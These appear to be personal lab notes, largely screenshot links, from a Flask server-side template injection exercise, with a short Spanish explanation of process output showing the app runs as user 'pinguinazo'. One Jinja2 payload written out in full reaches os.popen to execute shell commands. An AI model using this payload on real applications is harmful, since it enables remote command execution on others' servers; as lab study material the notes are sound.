![[Pasted image 20250228114121.png]]
![[Pasted image 20250228114606.png]]

![[Pasted image 20250228114822.png]]

![[Pasted image 20250228115236.png]]
![[Pasted image 20250228115744.png]]

![[Pasted image 20250228115846.png]]

![[Pasted image 20250228122517.png]]

![[Pasted image 20250228122546.png]]

![[Pasted image 20250228123633.png]]

![[Pasted image 20250228122639.png]]

![[Pasted image 20250228124134.png]]

![[Pasted image 20250228124206.png]]

``` bash
{{request.application.__globals__.__builtins__.__import__('os').popen('echo whoami | bash').read()}}
```

![[Pasted image 20250228124241.png]]

![[Pasted image 20250228124404.png]]

![[Pasted image 20250228124905.png]]

![[Pasted image 20250228125434.png]]

![[Pasted image 20250228125509.png]]

![[Pasted image 20250228125641.png]]

![[Pasted image 20250228130334.png]]

![[Pasted image 20250228130717.png]]

![[Pasted image 20250228130743.png]]

![[Pasted image 20250228130828.png]]

![[Pasted image 20250228131112.png]]

![[Pasted image 20250228131145.png]]

![[Pasted image 20250228132445.png]]

![[Pasted image 20250228133123.png]]

![[Pasted image 20250228135757.png]]
Viendo la salida de tu comando `ps aux | grep app.py`, parece que la aplicación Flask está siendo ejecutada por el usuario `pinguinazo` con el siguiente comando:

`python3 /home/pinguinazo/flask_ssti_lab/app.py`

Además, observamos que el comando está siendo ejecutado a través de un `su` (Switch User), lo que significa que la aplicación se ejecuta como un usuario específico en lugar de como root.







